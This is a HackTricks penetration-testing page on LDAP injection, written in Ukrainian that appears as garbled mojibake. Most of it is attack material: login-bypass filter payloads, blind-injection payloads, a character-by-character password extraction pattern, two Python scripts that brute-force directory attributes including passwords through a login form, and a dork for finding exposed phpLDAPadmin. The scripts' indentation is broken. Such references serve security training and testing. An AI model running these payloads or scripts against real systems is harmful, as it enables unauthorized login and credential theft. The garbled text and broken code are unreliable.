# LDAP Injection

## LDAP Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

## LDAP Injection

### **LDAP**

**–Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —â–æ —Ç–∞–∫–µ LDAP, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—É —Å—Ç–æ—Ä—ñ–Ω–∫—É:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection** - —Ü–µ –∞—Ç–∞–∫–∞, —â–æ –Ω–∞—Ü—ñ–ª–µ–Ω–∞ –Ω–∞ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∏, —è–∫—ñ —Ñ–æ—Ä–º—É—é—Ç—å LDAP-–∑–∞–ø–∏—Ç–∏ –∑ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –í–æ–Ω–∞ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ –¥–æ–¥–∞—Ç–æ–∫ **–Ω–µ –æ—á–∏—â–∞—î –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º** –≤–≤–µ–¥–µ–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º **–º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ LDAP-–∑–∞–ø–∏—Ç–∞–º–∏** —á–µ—Ä–µ–∑ –ª–æ–∫–∞–ª—å–Ω–∏–π –ø—Ä–æ–∫—Å—ñ, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –¥–∞–Ω–∏–º–∏.

{% file src="../.gitbook/assets/EN-Blackhat-Europe-2008-LDAP-Injection-Blind-LDAP-Injection.pdf" %}

**Filter** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ‚Äù=‚Äù \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = Absolute TRUE\
**(|)** = Absolute FALSE

For example:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

You can access to the database, and this can content information of a lot of different types.

**OpenLDAP**: –Ø–∫—â–æ –Ω–∞–¥—Ö–æ–¥—è—Ç—å 2 —Ñ—ñ–ª—å—Ç—Ä–∏, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ª–∏—à–µ –ø–µ—Ä—à–∏–π.\
**ADAM –∞–±–æ Microsoft LDS**: –ó 2 —Ñ—ñ–ª—å—Ç—Ä–∞–º–∏ –≤–∏–Ω–∏–∫–∞—î –ø–æ–º–∏–ª–∫–∞.\
**SunOne Directory Server 5.0**: –í–∏–∫–æ–Ω—É—î –æ–±–∏–¥–≤–∞ —Ñ—ñ–ª—å—Ç—Ä–∏.

**–î—É–∂–µ –≤–∞–∂–ª–∏–≤–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —Ñ—ñ–ª—å—Ç—Ä –∑ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—é —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–æ–º, —ñ–Ω–∞–∫—à–µ –≤–∏–Ω–∏–∫–Ω–µ –ø–æ–º–∏–ª–∫–∞. –ö—Ä–∞—â–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ª–∏—à–µ 1 —Ñ—ñ–ª—å—Ç—Ä.**

–§—ñ–ª—å—Ç—Ä –º–∞—î –ø–æ—á–∏–Ω–∞—Ç–∏—Å—è –∑: `&` –∞–±–æ `|`\
–ü—Ä–∏–∫–ª–∞–¥: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

–¢–æ–¥—ñ: `(&(objectClass=`**`*)(ObjectClass=*))`** –±—É–¥–µ –ø–µ—Ä—à–∏–º —Ñ—ñ–ª—å—Ç—Ä–æ–º (—Ç–∏–º, —â–æ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è).

### Login Bypass

LDAP –ø—ñ–¥—Ç—Ä–∏–º—É—î –∫—ñ–ª—å–∫–∞ —Ñ–æ—Ä–º–∞—Ç—ñ–≤ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –ø–∞—Ä–æ–ª—è: clear, md5, smd5, sh1, sha, crypt. –¢–æ–º—É –º–æ–∂–µ –±—É—Ç–∏ —Ç–∞–∫, —â–æ –Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, —â–æ –≤–∏ –≤–≤–µ–¥–µ—Ç–µ –≤ –ø–∞—Ä–æ–ª—å, –≤—ñ–Ω –±—É–¥–µ –∑–∞—Ö–∏—â–µ–Ω–∏–π.
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) ‚Äî> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### –°–ø–∏—Å–∫–∏

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP –ê—Ç—Ä–∏–±—É—Ç–∏](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [–ê—Ç—Ä–∏–±—É—Ç–∏ LDAP PosixAccount](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### –°–ª—ñ–ø–∞ LDAP –Ü–Ω'—î–∫—Ü—ñ—è

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–º—É—Å–∏—Ç–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ False –∞–±–æ True –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —â–æ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —á–∏ –ø–æ–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è —è–∫—ñ-–Ω–µ–±—É–¥—å –¥–∞–Ω—ñ, —ñ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏ –º–æ–∂–ª–∏–≤—É –°–ª—ñ–ø—É LDAP –Ü–Ω'—î–∫—Ü—ñ—é:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### –í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–∞–Ω–∏—Ö

–í–∏ –º–æ–∂–µ—Ç–µ —ñ—Ç–µ—Ä—É–≤–∞—Ç–∏—Å—è –ø–æ ASCII –ª—ñ—Ç–µ—Ä–∞–º, —Ü–∏—Ñ—Ä–∞–º —Ç–∞ —Å–∏–º–≤–æ–ª–∞–º:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### Scripts

#### **–í–∏—è–≤–ª–µ–Ω–Ω—è –¥—ñ–π—Å–Ω–∏—Ö –ø–æ–ª—ñ–≤ LDAP**

–û–±'—î–∫—Ç–∏ LDAP **–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º—ñ—Å—Ç—è—Ç—å –∫—ñ–ª—å–∫–∞ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤**, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **–∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó**. –í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –≤—Å—ñ –∑ –Ω–∏—Ö, —â–æ–± –≤–∏—Ç—è–≥—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.** –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Å–ø–∏—Å–æ–∫ [**–∞—Ç—Ä–∏–±—É—Ç—ñ–≤ LDAP –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ç—É—Ç**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt).
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **–°–ø–µ—Ü—ñ–∞–ª—å–Ω–∏–π —Å–ª—ñ–ø–∏–π LDAP-—ñ–Ω'—î–∫—Ü—ñ—è (–±–µ–∑ "\*")**
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### Google Dorks
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### –ë—ñ–ª—å—à–µ –ü–µ–π–ª–æ–∞–¥—ñ–≤

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∞—Å —Ü—ñ–∫–∞–≤–∏—Ç—å **–∫–∞—Ä'—î—Ä–∞ –≤ —Ö–∞–∫–µ—Ä—Å—Ç–≤—ñ** —ñ –≤–∏ —Ö–æ—á–µ—Ç–µ –∑–ª–∞–º–∞—Ç–∏ –Ω–µ–∑–ª–∞–º–Ω–µ - **–º–∏ –Ω–∞–π–º–∞—î–º–æ!** (_–≤–∏–º–∞–≥–∞—î—Ç—å—Å—è –≤—ñ–ª—å–Ω–µ –≤–æ–ª–æ–¥—ñ–Ω–Ω—è –ø–æ–ª—å—Å—å–∫–æ—é –º–æ–≤–æ—é –≤ –ø–∏—Å—å–º–æ–≤—ñ–π —Ç–∞ —É—Å–Ω—ñ–π —Ñ–æ—Ä–º—ñ_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
